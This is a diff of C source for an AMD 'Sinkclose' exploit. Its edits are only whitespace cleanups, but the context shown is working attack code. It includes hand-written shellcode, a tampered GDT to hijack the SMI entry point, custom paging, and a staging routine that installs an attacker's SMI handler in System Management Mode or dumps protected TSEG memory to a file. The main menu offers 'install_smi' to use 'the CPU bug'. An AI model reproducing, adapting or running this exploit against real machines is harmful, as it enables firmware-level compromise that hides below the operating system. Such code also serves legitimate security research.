@@ -25,7 +25,7 @@ extern "C" {
 
 #define SQUIRREL_BAR        0xD0800000
 
-/// Used for calculating sizes of the assembly functions 
+/// Used for calculating sizes of the assembly functions
 /// (shellcode defined in sinkclose.s)
 #define FUNCTION_END_NEEDLE "\x90\x90\x90\x90IOA\x90\x90\x90\x90\x90"
 
@@ -40,7 +40,7 @@ extern "C" {
 #define CORE0_SHELLCODE_ADDRESS         0x1000 // 400 bytes for initial 32bit payload (core0_shell)
 #define ORIGINAL_GDTR                   0x400 // GDTR to reload
 #define ORIGINAL_GDT_OFFSET             0x408 // Start of GDT to reload
-#define ORIGINAL_GDT                    0x1408 
+#define ORIGINAL_GDT                    0x1408
 
 #define CORE0_PML4                      0x2000  // Physical Address
 
@@ -102,8 +102,8 @@ struct _x64_staging_aux_data {
     UINT32 tseg_size;
     // This is a buffer used to copy out TSEG
     UINT64 buffer_ptr;
-    UINT32 handler_size;    
-    UINT8  handler_code[];        
+    UINT32 handler_size;
+    UINT8  handler_code[];
 };
 
 #pragma pack (pop)
@@ -201,28 +201,28 @@ int sinkclose_smi(SW_SMI_CALL *smi_call) {
 
     int status;
     #ifdef __linux__
-        status = ioctl(g_hDevice, IOCTL_SINKCLOSE, smi_call);           
-    #else //_WIN32        
+        status = ioctl(g_hDevice, IOCTL_SINKCLOSE, smi_call);
+    #else //_WIN32
         DWORD dwBytesReturned = 0;
         status = DeviceIoControl(
-            g_hDevice, 
-            IOCTL_SINKCLOSE, 
-            smi_call, sizeof(*smi_call), 
-            NULL, NULL, 
-            &dwBytesReturned, 
+            g_hDevice,
+            IOCTL_SINKCLOSE,
+            smi_call, sizeof(*smi_call),
+            NULL, NULL,
+            &dwBytesReturned,
             NULL
         );
-    #endif    
+    #endif
 
-    return status;  
+    return status;
 }
 
 
 void * allocate_page() {
     void *mem;
-    #ifdef __linux__ 
+    #ifdef __linux__
         mem = mmap(NULL, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
-    #else //_WIN32        
+    #else //_WIN32
         mem = VirtualAlloc(NULL, PAGE_SIZE, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     #endif
 
@@ -231,9 +231,9 @@ void * allocate_page() {
 }
 
 void free_page(void *page) {
-    #ifdef __linux__ 
+    #ifdef __linux__
         munmap(page, PAGE_SIZE);
-    #else //_WIN32        
+    #else //_WIN32
         VirtualFree(page, PAGE_SIZE, MEM_RELEASE);
     #endif
 }
@@ -244,18 +244,18 @@ void free_page(void *page) {
 #ifdef _WIN32
 #pragma code_seg(".x64_staging_section")
 #endif
-void 
+void
 #ifdef __linux__
-__attribute__((section(".x64_staging_section"))) 
+__attribute__((section(".x64_staging_section")))
 #endif
-x64_staging_func() {        
+x64_staging_func() {
 
     #ifdef SQUIRREL_DEBUG
         UINT32 *squirrel = (UINT32 *) SQUIRREL_BAR;
         squirrel[32] = 0x42424242;
     #endif
 
-    struct _x64_staging_aux_data *aux_data = 
+    struct _x64_staging_aux_data *aux_data =
              (struct _x64_staging_aux_data * ) X64_STAGING_FUNC_AUX_DATA_VADDR;
 
     UINT32 *tseg_start = (UINT32 *) aux_data->tseg_base;
@@ -270,18 +270,18 @@ x64_staging_func() {
     }
 
     #ifdef SQUIRREL_DEBUG
-        squirrel[34] = *ptr;    
+        squirrel[34] = *ptr;
     #endif
-    
+
     EFI_STATUS Status;
 
     #ifdef SQUIRREL_DEBUG
-        squirrel[35] = 0x41414141;          
+        squirrel[35] = 0x41414141;
     #endif
 
     #ifdef INSTALL_FCH_SMI_HANDLER
 
-        EFI_LOCATE_PROTOCOL SmmLocateProtocol = (EFI_LOCATE_PROTOCOL) 
+        EFI_LOCATE_PROTOCOL SmmLocateProtocol = (EFI_LOCATE_PROTOCOL)
                             *(UINT64 *)((char *)ptr + SMST_LOCATE_PROTOCOL_FUNC_OFFSET);
 
         EFI_SMM_SW_DISPATCH2_PROTOCOL  *SwDispatch;
@@ -289,30 +289,30 @@ x64_staging_func() {
         EFI_HANDLE                     SwHandle = 0;
 
         #ifdef SQUIRREL_DEBUG
-            squirrel[35] = 0x43434343;  
-            *(UINT64 *)&squirrel[36] = (UINT64) SmmLocateProtocol;  
+            squirrel[35] = 0x43434343;
+            *(UINT64 *)&squirrel[36] = (UINT64) SmmLocateProtocol;
         #endif
 
-        
+
         // Allocate pool of memory for the handler
 
         void *smi_handler_dst_location = NULL;
 
-        EFI_ALLOCATE_POOL SmmAllocatePool = (EFI_ALLOCATE_POOL) 
+        EFI_ALLOCATE_POOL SmmAllocatePool = (EFI_ALLOCATE_POOL)
                             *(UINT64 *)((char *)ptr + SMST_ALLOCATE_POOL_FUNC_OFFSET);
 
          Status = SmmAllocatePool (
-            RuntimeCode, 
-            aux_data->handler_size, 
+            RuntimeCode,
+            aux_data->handler_size,
             (void **)&smi_handler_dst_location
         );
 
         #ifdef SQUIRREL_DEBUG
-            *(UINT64 *)&squirrel[38] = (UINT64) smi_handler_dst_location;  
+            *(UINT64 *)&squirrel[38] = (UINT64) smi_handler_dst_location;
         #endif
 
-        // Memcpy        
-        UINT32 *dst_ptr = (UINT32 *) smi_handler_dst_location;    
+        // Memcpy
+        UINT32 *dst_ptr = (UINT32 *) smi_handler_dst_location;
         UINT32 *src_ptr = (UINT32 *) aux_data->handler_code;
         for ( int i = 0; i < (aux_data->handler_size >> 2); i++) {
             dst_ptr[i] = src_ptr[i];
@@ -320,36 +320,36 @@ x64_staging_func() {
 
         // Register FCH SMI Handler
 
-        EFI_GUID  gEfiSmmSwDispatch2ProtocolGuid = {            
+        EFI_GUID  gEfiSmmSwDispatch2ProtocolGuid = {
             0x18a3c6dc, 0x5eea, 0x48c8, {0xa1, 0xc1, 0xb5, 0x33, 0x89, 0xf9, 0x89, 0x99}
         };
 
         Status = SmmLocateProtocol(
             &gEfiSmmSwDispatch2ProtocolGuid,
-            NULL, 
+            NULL,
             (void **)&SwDispatch
         );
 
-        #ifdef SQUIRREL_DEBUG 
-            squirrel[40] = Status;    
-            *(UINT64 *)&squirrel[42] = (UINT64 ) SwDispatch;    
+        #ifdef SQUIRREL_DEBUG
+            squirrel[40] = Status;
+            *(UINT64 *)&squirrel[42] = (UINT64 ) SwDispatch;
         #endif
 
         SwContext.SwSmiInputValue = SINKCLOSE_SW_SMI_NUMBER;
 
         Status = SwDispatch->Register(
-            SwDispatch,  
-            (EFI_SMM_HANDLER_ENTRY_POINT ) smi_handler_dst_location, 
-            &SwContext, 
+            SwDispatch,
+            (EFI_SMM_HANDLER_ENTRY_POINT ) smi_handler_dst_location,
+            &SwContext,
             &SwHandle
         );
 
     #elif INSTALL_ROOT_SMI_HANDLER
 
-        EFI_SMM_INTERRUPT_REGISTER SmiHandlerRegister = (EFI_SMM_INTERRUPT_REGISTER) 
+        EFI_SMM_INTERRUPT_REGISTER SmiHandlerRegister = (EFI_SMM_INTERRUPT_REGISTER)
                             *(UINT64 *)((char *)ptr + SMST_SMI_HANDLER_REGISTER_FUNC_OFFSET);
 
-        EFI_GUID  gSinkcloseGuid = {            
+        EFI_GUID  gSinkcloseGuid = {
             0x11111111, 0x1111, 0x1111, {0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11, 0x11}
         };
 
@@ -364,7 +364,7 @@ x64_staging_func() {
 
 
     #ifdef DUMP_TSEG
-        UINT32 *dst_ptr = (UINT32 *) aux_data->buffer_ptr;    
+        UINT32 *dst_ptr = (UINT32 *) aux_data->buffer_ptr;
         UINT32 *src_ptr = tseg_start;
         for ( int i = 0; i < (tseg_size >> 2); i++) {
             dst_ptr[i] = src_ptr[i];
@@ -372,8 +372,8 @@ x64_staging_func() {
     #endif
 
 
-    #ifdef SQUIRREL_DEBUG        
-        squirrel[48] = 0x45454545;    
+    #ifdef SQUIRREL_DEBUG
+        squirrel[48] = 0x45454545;
     #endif
 
     return;
@@ -383,24 +383,24 @@ x64_staging_func() {
 #pragma code_seg()
 #endif
 
-void 
+void
 #ifdef __linux__
-__attribute__((section(".marker_section1"))) 
+__attribute__((section(".marker_section1")))
 #endif
 marker_section1() {};
 
 
 
-/// @brief  Gets the size of the x64_staging function 
+/// @brief  Gets the size of the x64_staging function
 ///         by calculating the distance between sections
-/// @return 
+/// @return
 UINT32 get_x64_staging_size() {
     UINT32 section_size = 0;
     #ifdef __linux__
     section_size = ((UINT64)marker_section1 - (UINT64)x64_staging_func);
-    #else 
-    section_size = PAGE_SIZE; 
-    #endif    
+    #else
+    section_size = PAGE_SIZE;
+    #endif
     return section_size;
 }
 
@@ -461,13 +461,13 @@ void prepare_shellcode_core0(UINT32 smi_entry_point) {
 
     // Get pointer to the needle and calculate function size
     void *ptr = memmem(
-        (void *) &_core0_shell, 
-        PAGE_SIZE, 
-        FUNCTION_END_NEEDLE, 
+        (void *) &_core0_shell,
+        PAGE_SIZE,
+        FUNCTION_END_NEEDLE,
         sizeof(FUNCTION_END_NEEDLE) - 1
     );
 
-    UINT32 sh_len = (UINT64)ptr -  (UINT64)_core0_shell;    
+    UINT32 sh_len = (UINT64)ptr -  (UINT64)_core0_shell;
     printf("core0_shell is %d bytes long\n", sh_len);
 
     printf("copying core0_shell to physical address %08x\n", CORE0_SHELLCODE_ADDRESS);
@@ -477,19 +477,19 @@ void prepare_shellcode_core0(UINT32 smi_entry_point) {
     memcpy(shellcode_page, (void *) _core0_shell, sh_len);
 
 
-    // Create a copy of the GDT at offset ORIGINAL_GDT_OFFSET 
+    // Create a copy of the GDT at offset ORIGINAL_GDT_OFFSET
     // This is used by core0_shell to reload the gdt and have clean flat descriptors
     // It needs to be placed in physical address 0x1000 because our paging layout
     memcpy(
-        (char*)shellcode_page + ORIGINAL_GDT_OFFSET, 
-        (char*)FAKE_GDT, 
+        (char*)shellcode_page + ORIGINAL_GDT_OFFSET,
+        (char*)FAKE_GDT,
         sizeof(FAKE_GDT)
     );
 
     // Setup GDTR
     *(UINT16 *)((char*)shellcode_page + ORIGINAL_GDTR) = sizeof(FAKE_GDT) - 1;
     *(UINT32 *)((UINT16 *)((char*)shellcode_page + ORIGINAL_GDTR) + 1) = ORIGINAL_GDT;
-    
+
 
     unmap_physical_memory(shellcode_page, PAGE_SIZE);
 }
@@ -551,7 +551,7 @@ void prepare_shellcode_core1(UINT32 smm_save_state_area) {
         "\x89\x01"                                  // mov DWORD PTR [ecx],eax
 
         // Offset 118
-        // Set auto-halt restart 
+        // Set auto-halt restart
         // "\xB9\x41\x41\x41\x41"                      // mov ecx, SMM_BASE + FEC9
         // "\x31\xc0"                                  // xor eax, eax
         // "\x40"                                      // inc eax
@@ -569,7 +569,7 @@ void prepare_shellcode_core1(UINT32 smm_save_state_area) {
 
         "\x0f\xaa";                                // rsm
 
-    
+
     #define SMM_SAVE_STATE__OFFSET_RIP 0x178
     #define SMM_SAVE_STATE__OFFSET_RBP 0x1d0
     #define SMM_SAVE_STATE__OFFSET_RSP 0x1d8
@@ -577,26 +577,26 @@ void prepare_shellcode_core1(UINT32 smm_save_state_area) {
     #define SMM_SAVE_STATE__OFFSET_AUTO_HALT_RESTART 0xC9
 
     patch_shellcode_ptr(
-        shellcode_core1, 
-        22, 
+        shellcode_core1,
+        22,
         smm_save_state_area + SMM_SAVE_STATE__OFFSET_RIP
     );
 
     patch_shellcode_ptr(
-        shellcode_core1, 
-        46, 
+        shellcode_core1,
+        46,
         smm_save_state_area + SMM_SAVE_STATE__OFFSET_RSP
     );
 
     patch_shellcode_ptr(
-        shellcode_core1, 
-        70, 
+        shellcode_core1,
+        70,
         smm_save_state_area + SMM_SAVE_STATE__OFFSET_RBP
     );
 
     patch_shellcode_ptr(
-        shellcode_core1, 
-        94, 
+        shellcode_core1,
+        94,
         smm_save_state_area + SMM_SAVE_STATE__OFFSET_CR3
     );
 
@@ -617,7 +617,7 @@ struct x_mapping {
     UINT32 size;
 
     UINT32 aligned_size;
-    UINT64 vaddr;        
+    UINT64 vaddr;
     UINT32 num_pages;
     void **pages;
     UINT32 num_tables;
@@ -644,7 +644,7 @@ static void print_mapping(struct x_mapping *mapping) {
                 //  1ED,0,4,1   ->
 #define DMA_BUFFER_MAPPED_ADDR 0xfffff68000800000
 UINT64 create_large_buffer(struct alloc_user_physmem *pdpt_page, struct x_mapping **mapping) {
-    
+
     struct _pxe *pxe;
 
     *mapping = (struct x_mapping *) calloc(1, sizeof(struct x_mapping));
@@ -691,7 +691,7 @@ UINT64 create_large_buffer(struct alloc_user_physmem *pdpt_page, struct x_mappin
 
         // printf("Page-%d %016llx -> physaddr: %016llx (table %d)\n",
         //      i, page, page_pa, k);
-        
+
         // Fill the information in the table entry
 
         // set present
@@ -750,7 +750,7 @@ UINT64 create_large_buffer(struct alloc_user_physmem *pdpt_page, struct x_mappin
 void destroy_mapping(struct x_mapping **mapping) {
 
     void **pages = (void **) (*mapping)->pages;
-    for (int i = 0; i < (*mapping)->num_pages; i++) {       
+    for (int i = 0; i < (*mapping)->num_pages; i++) {
         void *page = ((void **)pages)[i];
         free_page(page);
     }
@@ -764,7 +764,7 @@ void destroy_mapping(struct x_mapping **mapping) {
         void *table = ((void **)tables)[i];
         free_page(table);
     }
-    
+
     //printf("free the tables buffer\n");
     free((*mapping)->tables);
 
@@ -777,10 +777,10 @@ void destroy_mapping(struct x_mapping **mapping) {
 
 /// @brief  sets up a recursive paging structure at CORE0_PML4
 void prepare_paging(
-    struct alloc_user_physmem *pdpt_page, 
-    UINT64 x64_staging_func_pa, 
-    UINT64 stack_pa, 
-    UINT64 aux_buff_pa) 
+    struct alloc_user_physmem *pdpt_page,
+    UINT64 x64_staging_func_pa,
+    UINT64 stack_pa,
+    UINT64 aux_buff_pa)
 {
 
 
@@ -789,15 +789,15 @@ void prepare_paging(
     //     exit(-1);
     // }
 
-    
+
     void *pml4 = map_physical_memory(CORE0_PML4, PAGE_SIZE);
     memset(pml4, 0x00, PAGE_SIZE);
 
     struct _pxe *pxe;
-    
+
     // Map the recursive entry at 0x1ED (memories)
     pxe = (struct _pxe *) ((UINT64 *)pml4 + PG_RECURSIVE_ENTRY);
-    
+
     // set present
     pxe->parts.p    = 1;
     // set RW
@@ -810,10 +810,10 @@ void prepare_paging(
     pxe->parts.d    = 1;
     //
     pxe->parts.pfn  = PFN(CORE0_PML4);
-    
+
 
     pxe++; // Put the x64_staging function at 0x1EE
-    
+
     // VADDR then is: 0xfffff6fb7dbee000
     // set present
     pxe->parts.p    = 1;
@@ -827,7 +827,7 @@ void prepare_paging(
     pxe->parts.d    = 1;
     //
     pxe->parts.pfn  = PFN(x64_staging_func_pa);
-    
+
 
     pxe++;
 
@@ -863,10 +863,10 @@ void prepare_paging(
     // Maps the PDPT located at CORE0_PDPT
     pxe->parts.pfn  = PFN(pdpt_page->pa);
 
-    
 
 
-    pxe = (struct _pxe *) ((UINT64 *) pml4 + PG_AUX_DATA_ENTRY); 
+
+    pxe = (struct _pxe *) ((UINT64 *) pml4 + PG_AUX_DATA_ENTRY);
 
     // (Entry-511) AUX Data for x64_staging
     pxe->parts.p    = 1;
@@ -878,7 +878,7 @@ void prepare_paging(
     pxe->parts.a    = 1;
     // set D
     pxe->parts.d    = 1;
-   
+
     pxe->parts.pfn  = PFN(aux_buff_pa);
 
 
@@ -886,9 +886,9 @@ void prepare_paging(
 
     /*
      0      -> PDPT
-     
+
      ..
-     1ED    -> Recursive entry 
+     1ED    -> Recursive entry
      1EE    -> x64_staging_func (through the recursive entry)
      1EF      -> Stack (4096) (through the recursive entry)
                 0xfffff6fb7dbef000
@@ -949,7 +949,7 @@ void prepare_paging(
     // set D
     pxe->parts.d    = 1;
     // LARGE PAGE (1Gig)
-    pxe->parts.ps   = 1; 
+    pxe->parts.ps   = 1;
     // Maps 0x80000000 - 0xC0000000
     pxe->parts.pfn  = PFN(0x80000000);
 
@@ -966,7 +966,7 @@ void prepare_paging(
     // set D
     pxe->parts.d    = 1;
     // LARGE PAGE (1Gig)
-    pxe->parts.ps   = 1; 
+    pxe->parts.ps   = 1;
     // Maps 0xC0000000 - 0xFFFFFFFF
     pxe->parts.pfn  = PFN(0xC0000000);
 }
@@ -975,7 +975,7 @@ void prepare_paging(
 void dump_mapping(struct x_mapping *mapping) {
     FILE *fp = fopen("tseg_dumpx.bin", "wb");
     void **pages = (void **) mapping->pages;
-    for (int i = 0; i < mapping->num_pages; i++) {       
+    for (int i = 0; i < mapping->num_pages; i++) {
         void *page = ((void **)pages)[i];
         fwrite(page, PAGE_SIZE, 1, fp);
     }
@@ -991,17 +991,17 @@ void dump_mapping(struct x_mapping *mapping) {
 #ifdef __linux__
 __attribute__((ms_abi))
 #endif
-void 
+void
 #ifdef __linux__
-__attribute__((section(".smi_handler"))) 
+__attribute__((section(".smi_handler")))
 #endif
 smi_handler(
     EFI_HANDLE DispatchHandle,
     void       *DispatchContext,
     void       *SwContext,
-    UINT32     *SizeOfSwContext 
-    ) 
-{    
+    UINT32     *SizeOfSwContext
+    )
+{
     #ifdef SQUIRREL_DEBUG
         UINT32 *squirrel = (UINT32 *) SQUIRREL_BAR;
         squirrel[0] = 0xAAAAAAAA;
@@ -1011,23 +1011,23 @@ smi_handler(
 #pragma code_seg()
 #endif
 
-void 
+void
 #ifdef __linux__
-__attribute__((section(".marker_section2"))) 
+__attribute__((section(".marker_section2")))
 #endif
 marker_section2() {};
 
 
-/// @brief  Gets the size of the smi_handler function 
+/// @brief  Gets the size of the smi_handler function
 ///         by calculating the distance between sections
-/// @return 
+/// @return
 UINT32 get_smi_handler_size() {
-    UINT32 section_size = 0;    
-    #ifdef __linux__    
-        section_size = ((UINT64)marker_section2 - (UINT64)smi_handler);    
+    UINT32 section_size = 0;
+    #ifdef __linux__
+        section_size = ((UINT64)marker_section2 - (UINT64)smi_handler);
     #else
         section_size = PAGE_SIZE;
-    #endif   
+    #endif
     return section_size;
 }
 
@@ -1038,7 +1038,7 @@ void sinkclose_exploit()
     // Get SMM base location
     UINT64 smm_base_core0 = 0;
     do_read_msr_for_core(0, AMD_MSR_SMM_BASE_ADDRESS, &smm_base_core0);
-    
+
     UINT64 smm_base_core1 = smm_base_core0 + SMM_BASE_DISTANCE;
 
     UINT32 smm_entry_point_core0 = smm_base_core0 + AMD_SMI_HANDLER_ENTRY_POINT;
@@ -1047,7 +1047,7 @@ void sinkclose_exploit()
 
     // Set the fake GDT for core 0 and core 1
     UINT32 gdt_cs_base = 0x100000000 - (smm_entry_point_core0 + 0x53) + CORE0_SHELLCODE_ADDRESS;
-    
+
     void* gdt_physpage = map_physical_memory(0x00000000, PAGE_SIZE);
 
     // Set the tampered offset for the GDT located at 0xFFFFFFFF
@@ -1073,7 +1073,7 @@ void sinkclose_exploit()
     prepare_shellcode_core1(smm_base_core1 + AMD_SMM_STATE_SAVE_AREA);
 
 
-    // Prepare recursive paging structure    
+    // Prepare recursive paging structure
 
     // a .Copy the x64 staging function into a single page of memory
     struct alloc_user_physmem x64_staging_page = {0};
@@ -1082,10 +1082,10 @@ void sinkclose_exploit()
         printf("failed to allocate page for x64_staging_func\n");
         exit(-1);
     }
-    
+
     memcpy(
-        (void *) x64_staging_page.va, 
-        (void *) x64_staging_func, 
+        (void *) x64_staging_page.va,
+        (void *) x64_staging_func,
         get_x64_staging_size()
     );
 
@@ -1119,18 +1119,18 @@ void sinkclose_exploit()
 
     memset((void *)pdpt_page.va, 0x00, PAGE_SIZE);
 
-    // Prepare paging layout 
+    // Prepare paging layout
     prepare_paging(
         &pdpt_page,
-        x64_staging_page.pa, 
-        stack_page.pa, 
-        aux_data_page.pa 
+        x64_staging_page.pa,
+        stack_page.pa,
+        aux_data_page.pa
     );
 
 
     // Setup the aux buff
 
-    struct _x64_staging_aux_data *aux_data = 
+    struct _x64_staging_aux_data *aux_data =
             (struct _x64_staging_aux_data * )aux_data_page.va;
 
     // Get TSEG config
@@ -1151,30 +1151,30 @@ void sinkclose_exploit()
         }
 
         memcpy(
-            (void *) aux_data->handler_code, 
-            (void *) smi_handler, 
+            (void *) aux_data->handler_code,
+            (void *) smi_handler,
             aux_data->handler_size
         );
-    #endif 
-    // Get contiguous chunk of physical memory 
+    #endif
+    // Get contiguous chunk of physical memory
     // and map it to our paging structures
     #ifdef DUMP_TSEG
         struct x_mapping *mapping;
         aux_data->buffer_ptr = create_large_buffer(&pdpt_page, &mapping);
     #endif
-    
+
     SW_SMI_CALL smi_call = { 0 };
-    smi_call.rax = 0x31337;    
+    smi_call.rax = 0x31337;
     sinkclose_smi(&smi_call);
 
-    printf("Triggering exploit...\n");    
+    printf("Triggering exploit...\n");
 
     smi_call.rax = 0x31338;
     // Sets the TClose on Core0 (And Core1 due to Hyperthreading)
-     
-    // Trigger attack    
+
+    // Trigger attack
     sinkclose_smi(&smi_call);
-    
+
     //// Enable for dumping TSEG
     #ifdef DUMP_TSEG
         dump_mapping(mapping);
@@ -1209,10 +1209,10 @@ void enable_squirrel() {
 
 void run_exploit() {
 
-    // Save content of physical pages used   
+    // Save content of physical pages used
     void *p0 = map_physical_memory(0x00000000, PAGE_SIZE);
-    void *p1 = map_physical_memory(0x00001000, PAGE_SIZE);    
-    void *p2 = map_physical_memory(0x00002000, PAGE_SIZE);  
+    void *p1 = map_physical_memory(0x00001000, PAGE_SIZE);
+    void *p2 = map_physical_memory(0x00002000, PAGE_SIZE);
     void *p3 = map_physical_memory(0x00003000, PAGE_SIZE);
 
     void *px[] = { p0, p1, p2, p3 };
@@ -1234,8 +1234,8 @@ void run_exploit() {
     /// Restore physical pages content
     for (int i = 0 ; i < pages_used; i++) {
         memcpy(px[i], &buff[PAGE_SIZE * i], PAGE_SIZE);
-        unmap_physical_memory(px[i], PAGE_SIZE); 
-    } 
+        unmap_physical_memory(px[i], PAGE_SIZE);
+    }
 
     free(buff);
 }
@@ -1244,11 +1244,11 @@ void run_exploit() {
 
 
 
-void run_smi() {        
+void run_smi() {
     #ifdef INSTALL_FCH_SMI_HANDLER
         printf("Invoking FCH Smi Handler %02x\n", SINKCLOSE_SW_SMI_NUMBER);
         // Invoke our SMI
-        SW_SMI_CALL smi_call = {0};     
+        SW_SMI_CALL smi_call = {0};
         smi_call.SwSmiNumber = SINKCLOSE_SW_SMI_NUMBER;
         smi_call.SwSmiData   = 0xFF;
         trigger_smi(&smi_call);
@@ -1263,8 +1263,8 @@ void schedule_on_other_cores() {
     int num_cpus = sysconf(_SC_NPROCESSORS_ONLN);
 
     CPU_ZERO(&mask);
-    for (int i = 2; i < num_cpus; i++) {        
-        CPU_SET(i, &mask);        
+    for (int i = 2; i < num_cpus; i++) {
+        CPU_SET(i, &mask);
     }
 
     if (sched_setaffinity(0, sizeof(mask), &mask) == -1) {
@@ -1272,7 +1272,7 @@ void schedule_on_other_cores() {
         exit(EXIT_FAILURE);
     }
 }
-#else 
+#else
 void schedule_on_other_cores() {
     DWORD_PTR processAffinityMask = 0;
     DWORD_PTR systemAffinityMask = 0;
@@ -1312,12 +1312,12 @@ int current_running_core() {
         return sched_getcpu();
     #else
         return GetCurrentProcessorNumber();
-    #endif    
+    #endif
 }
 
 
 int main(int argc, char** argv)
-{   
+{
     if (argc < 2) {
         printf("Usage: %s <option>\n", argv[0]);
         printf(" 'install_smi' -> uses the CPU bug to install our SMI handler\n");
@@ -1342,9 +1342,9 @@ int main(int argc, char** argv)
         run_exploit();
     } else if (strcmp(argv[1], "run_smi") == 0) {
         run_smi();
-    }   
+    }
 
     close_platbox_device();
 
-    return 0; 
+    return 0;
 }
